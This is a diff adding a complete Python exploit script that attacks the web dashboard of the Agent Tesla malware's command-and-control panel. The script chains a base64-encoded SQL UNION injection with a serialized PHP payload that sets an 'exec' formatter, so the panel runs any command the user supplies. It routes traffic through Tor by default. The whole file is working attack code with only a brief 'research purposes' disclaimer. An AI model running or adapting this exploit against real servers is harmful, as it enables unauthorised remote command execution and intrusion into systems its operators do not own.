@@ -1,0 +1,54 @@
+import requests
+import argparse
+import base64
+
+# Agent Tesla C2 RCE by prsecurity
+# For research purposes only. Don't pwn what you don't own.
+
+def get_args():
+	parser = argparse.ArgumentParser(
+		prog="agent_tesla_sploit.py",
+		formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=50),
+		epilog= '''
+		This script will exploit the RCE/SQL vulnerability in Agent Tesla Dashboard.
+		''')
+	parser.add_argument("target", help="URL of WebPanel (ex: http://target.com/WebPanel/)")
+	parser.add_argument("-c", "--command", default="id", help="Command to execute (default = id)")
+	parser.add_argument("-p", "--proxy", default="socks5://localhost:9150", help="Configure a proxy in the format http://127.0.0.1:8080/ (default = tor)")
+	args = parser.parse_args()
+	return args
+
+def pwn_target(target, command, proxy):
+	requests.packages.urllib3.disable_warnings()
+	proxies = {'http': proxy, 'https': proxy}
+	print('[*] Probing...')
+	get_params = {
+		'table':'screens', 
+		'primary':'HWID', 
+		'clmns':'a:1:{i:0;a:3:{s:2:"db";s:4:"HWID";s:2:"dt";s:4:"HWID";s:9:"formatter";s:4:"exec";}}', 
+		'where': base64.b64encode("1=1 UNION SELECT \"{}\"".format(command).encode('utf-8'))
+	}
+	target = target + '/server_side/scripts/server_processing.php'
+	try:
+		r = requests.get("http://bot.whatismyipaddress.com", proxies=proxies)
+		print("[*] Your IP: {}".format(r.text))
+		headers = {
+			"User-agent":"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
+		}
+		r = requests.get(target, params=get_params, headers=headers, verify=False, proxies=proxies)
+		result = r.json()['data'][-1]['HWID']
+		print('[+] {}'.format(result))
+	except:
+		print("[-] ERROR: Something went wrong.")
+		print(r.text)
+		raise
+
+def main():
+	print ()
+	print ('Agent Tesla RCE by prsecurity.')
+	args = get_args()
+	pwn_target(args.target.strip(), args.command.strip(), args.proxy.strip())
+
+
+if __name__ == '__main__':
+	main()
